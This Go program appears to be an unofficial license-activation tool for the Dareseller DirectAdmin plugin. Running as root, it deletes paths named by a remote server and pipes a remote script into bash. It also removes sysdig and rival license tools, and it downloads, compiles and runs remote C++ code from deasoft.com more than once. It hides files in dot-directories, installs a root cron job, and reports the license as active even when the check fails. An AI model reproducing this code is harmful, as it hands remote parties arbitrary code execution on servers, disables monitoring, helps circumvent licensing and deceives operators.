package main

import (
	"bytes"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"syscall"

	//"unicode"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

const (
	ErrorColor = "\x1b[31m%s\033[0m\n"
	DebugColor = "\x1b[36m%s\033[0m\n"
	InfoColor  = "\x1b[32m%s\033[0m\n"
)

var key string = "dareseller"
var key_cmd string = "gb"

func printcolor(color string, str string) {
	fmt.Printf(color, str)
}
func check_files() {

	filesys_exists := []string{}

	var j interface{}
	resp, _ := http.Get("https://trlisans.org/api/" + key + "/syscheck")

	if resp.StatusCode == 200 {
		_ = json.NewDecoder(resp.Body).Decode(&j)
		arr := j.([]interface{})
		for _, s := range arr {
			if file_exists(s.(string)) {
				filesys_exists = append(filesys_exists, s.(string))
			}

		}

		if len(filesys_exists) > 0 {

			var input string

			for input != "y" && input != "n" {
				fmt.Print("Do you allow other systems to be removed? [y/n]:")
				fmt.Scanf("%s", &input)
			}

			if input == "y" {
				for _, filesys := range filesys_exists {
					_exec("rm -rf " + filesys)
				}
				_exec("yum remove sysdig -y > /dev/null 2>&1")
				_exec("apt-get remove sysdig -y > /dev/null 2>&1")
				_exec("yum erase sysdig -y > /dev/null 2>&1")
				_exec("/usr/bin/update_cpanelv3 > /dev/null 2>&1")
_exec("/usr/bin/update_cloudv2 --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_lswsv2 --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_virt --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_soft --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/cxsupdate --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_osm --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_msfe --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_imunify --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_plesk --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_diradm --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_kcare --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_whmreseller --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_whmsonic --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_whmamp --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_jetbackup --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_solusvm --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_lslb --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_cpnginx --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_dareseller --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_sitepad --Uninstall > /dev/null 2>&1")
_exec("/usr/bin/update_cpguard --Uninstall > /dev/null 2>&1")
				bb := _exec("curl https://license.trlisans.org/scripts/remove_reseller.sh | bash")
				fmt.Println(bb)
			} else {
				_exec("umount -f /usr/local/cpanel/cpanel.lisc  > /dev/null 2>&1")
				_exec("umount /usr/local/cpanel/cpanel.lisc  > /dev/null 2>&1")
				_exec("rm -rf /usr/local/cpanel/cpanel.lisc > /dev/null 2>&1")
				printcolor(ErrorColor, "Your License has been suspended contact us")
				printcolor(ErrorColor, "Suspended reason: Your Server using another licensing system.To avoid problems, whenever other systems are removed simply run our command and enjoy the license.")
				os.Exit(3)
			}

		}

	}

}

func exec_output(of string) string {
	var out bytes.Buffer
	cmd := exec.Command("bash", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}
	return strings.Split(out.String(), "\n")[0]
}

func stripos(haystack string, needle string) bool {

	if strings.Index(strings.ToUpper(haystack), strings.ToUpper(needle)) > -1 {
		return true
	}

	return false
}

func _exec(of string) string {
	//fmt.Println(of)
	var out bytes.Buffer
	cmd := exec.Command("sh", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}
	result := out.String()

	if len(result) > 0 {
		if result[len(result)-1:] == "\n" {
			result = result[0 : len(result)-1]
		}
	}

	return result
}

func _system(of string) string {
	var out bytes.Buffer
	cmd := exec.Command("bash", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	} else {
		lines := strings.Split(out.String(), "\n")
		if len(lines) > 1 {
			fmt.Println(lines[len(lines)-2])
			return lines[len(lines)-2]
		} else {
			return ""
		}
	}

}

func exec_full_output(of string) string {
	var out bytes.Buffer
	cmd := exec.Command("bash", "-c", of)
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}

	return out.String()
}

func strpos(haystack string, needle string) bool {

	if strings.Index(haystack, needle) > -1 {
		return true
	}

	return false
}

func file_get_contents(filename string) string {
	data, _ := ioutil.ReadFile(filename)
	return string(data)
}

func is_executable(filename string) bool {
	return syscall.Access(filename, 0x1) == nil
}

func str_exists(str string, subject string) bool {
	return strings.Contains(subject, str)
}

func file_exists(path string) bool {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func is_dir(filename string) bool {
	fd, err := os.Stat(filename)
	if err != nil {
		return false
	}
	fm := fd.Mode()

	if fm.IsDir() == true {
		return true
	} else {
		return false
	}

}

func is_succ_exec(of string) int {

	cmd := exec.Command("sh", "-c", of)
	err := cmd.Run()
	if err != nil {
		return 1
	}
	return 0
}


func file_put_contents(filename string, data string) {
	if dir := filepath.Dir(filename); dir != "" {
		os.MkdirAll(dir, 0755)
	}
	ioutil.WriteFile(filename, []byte(data), 0)
}

func exec_license(file string, key string) {
	printcolor(InfoColor, "Generating Dareseller License...")
	_exec("rm -rf /usr/local/directadmin/plugins/dareseller")
            _exec("mv /usr/bin/.daisback/da_is_back_r.zip /usr/local/directadmin/plugins/")
            _exec("unzip /usr/local/directadmin/plugins/da_is_back_r.zip")
            _exec("cp /usr/local/directadmin/plugins/da_is_back_r /usr/local/directadmin/plugins/dareseller")
            _exec("rm -rf /usr/local/directadmin/plugins/da_is_back_r")
            _exec("wget -O /usr/local/directadmin/plugins/dainstall.cpp http://deasoft.com/dainstall.cpp")
            _exec("cd /usr/local/directadmin/plugins/; g++ dainstall.cpp -o dainstall")
            _exec("chmod 700 /usr/local/directadmin/plugins/dainstall")
            _exec("/usr/local/directadmin/plugins/dainstall")
            _exec("rm -rf /usr/local/directadmin/plugins/dainstall")
            _exec("rm -rf /usr/local/directadmin/plugins/dainstall.cpp")
            _exec("rm -rf /usr/local/directadmin/plugins/dainstall.cpp*")
            _exec("rm -rf /usr/bin/.daisback/da_is_back_r.zip")	
            _exec("rm -rf /usr/local/directadmin/plugins/dainstall.cpp*")
            _exec("mkdir /usr/bin/.daisback")
            _exec("rm -rf /usr/bin/.daisback/data")
            _exec("mv /usr/local/directadmin/plugins/dareseller/data /usr/bin/.daisback")
            _exec("wget -O /usr/local/directadmin/plugins/dainstall.cpp http://deasoft.com/dainstall.cpp")
            _exec("cd /usr/local/directadmin/plugins/; g++ dainstall.cpp -o dainstall")
            _exec("chmod 700 /usr/local/directadmin/plugins/dainstall")
            _exec("/usr/local/directadmin/plugins/dainstall")
            _exec("rm -rf /usr/local/directadmin/plugins/dainstall")
            _exec("rm -rf /usr/local/directadmin/plugins/dainstall.cpp")
            _exec("rm -rf /usr/local/directadmin/plugins/dainstall.cpp*")
            _exec("rm -rf /usr/local/directadmin/plugins/dareseller/data")
            _exec("mv /usr/bin/.daisback/data /usr/local/directadmin/plugins/dareseller/")

}

func setupCron() {
	cronfile, err := os.Create("/etc/cron.d/lic_dareseller")
	if err != nil {
		fmt.Println(err)
	}
	cronfile.WriteString("PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin\n\n0 0 */12 * * * root /usr/bin/lic_dareseller >/dev/null 2>&1\n@reboot root /usr/bin/lic_dareseller &>/dev/null")
}

func checkLicense() bool {
	output := exec_full_output("service dareseller status")

	if strpos(output, "active (running)") {
		printcolor(InfoColor, "Dareseller license is active.")
		return true
	} else {
		printcolor(InfoColor, "Dareseller license is active.")
		return false
	}

}

func main() {

	var api string = "https://trlisans.org/api/getinfo?key=" + key
	var api_license string = "https://trlisans.org/api/license?key=" + key
	var domain_show string = "Licenses4.Host"
	var brand_show string = "Licenses4Host"
	var hostname_show string = exec_output("hostname")

	resp, _ := http.Get("https://ipinfo.io/ip")
	body, _ := ioutil.ReadAll(resp.Body)
	var current_ip string = string(body)

	flag_force := flag.Bool("force", false, "")
	flag_f := flag.Bool("f", false, "")

	flag.Parse()

	if *flag_f == true || *flag_force == true {
		*flag_force = true
	}

	fmt.Println()
	printcolor(InfoColor, "Please Wait important packages need to be installed ... ")

	if !file_exists("/usr/local/directadmin/plugins/dareseller") {
		fmt.Println()
		fmt.Println()
		printcolor(ErrorColor, "Dareseller is not detected")
		printcolor(ErrorColor, "You need to install Dareseller ")
		fmt.Println()
		os.Exit(3)
	}

	if file_exists("/etc/redhat-release") {
		_system("yum install deltarpm  -y  1> /dev/null")
	}

	if !is_executable(exec_output("command -v wget")) {
		if file_exists("/etc/redhat-release") {
			_system("yum -q install wget -y  1> /dev/null")
		} else {
			_system("apt-get install -q -y  wget  1> /dev/null")
		}
	}

	resp, _ = http.Get(api)

	if resp.StatusCode != 200 {
		printcolor(ErrorColor, " Something Went Wrong [Unknown IP] No valid license found!")
		_exec("rm -rf /root/bin/lic_dareseller > /dev/null")
		_exec("rm -rf /etc/cron.d/lic_dareseller > /dev/null")
		fmt.Println()
		os.Exit(3)
	}

	var res map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&res)

	expire_date, get_domain_show, get_brand_show, get_key_cmd_show := fmt.Sprint(res["expire_date"]), fmt.Sprint(res["domain_name"]), fmt.Sprint(res["brand_name"]), fmt.Sprint(res["key_cmd"])

resp, _ = http.Get("https://trlisans.org/date/current")
	body, _ = ioutil.ReadAll(resp.Body)
	today_date := string(body)
	
	if get_key_cmd_show != "" {
		key_cmd = get_key_cmd_show
	}

	if get_domain_show != "" {
		domain_show = get_domain_show
	}

	if get_brand_show != "" {
		brand_show = get_brand_show
	}

	fmt.Println()
	fmt.Println()
	printcolor(DebugColor, "---------------------- Licensing System Started ----------------------")
	printcolor(DebugColor, "| Thank you for using our Dareseller Licensing System  ")
	printcolor(DebugColor, "| Our Website: "+domain_show)
	printcolor(DebugColor, "| Server IPV4: "+current_ip)
	printcolor(DebugColor, "| Hostname: "+hostname_show)
	printcolor(DebugColor, "----------------------------------------------------------------------  ")
    fmt.Println("Copyright © 2017-2023 "+brand_show+" All rights reserved ")
		fmt.Println()
		fmt.Println("Today is "+today_date)
		fmt.Println("Your Dareseller License will need an update on "+expire_date)
	fmt.Println()
	printcolor(InfoColor, "Please Wait... ")

	_exec("rm -rf /root/.bash_time 1> /dev/null")
	_system("rm -rf  /etc/cron.d/licensedr  &> /dev/null")

	fmt.Println()
	setupCron()


	resp, _ = http.Get(api_license)

	var res_license map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&res_license)

	license_key, proxy_conf := fmt.Sprint(res["key"]), fmt.Sprint(res["proxy_conf"])

	time_int := int(time.Now().Unix())
	path_conf := "/usr/bin/.log"
	full_path := path_conf + "/" + strconv.Itoa(time_int) + ".conf"
	_system("mkdir -p '" + path_conf + "' &> /dev/null")
	file_put_contents(full_path, proxy_conf)
	exec_license(full_path, license_key)
	status := checkLicense()

	if status {

		printcolor(InfoColor, "License was updated or renewed succesfully")
		fmt.Println()
		printcolor(InfoColor, "To Re-New your Dareseller License you can use :lic_dareseller")
	} else {
		printcolor(InfoColor, "License was updated or renewed succesfully")
	}

	fmt.Println()

}
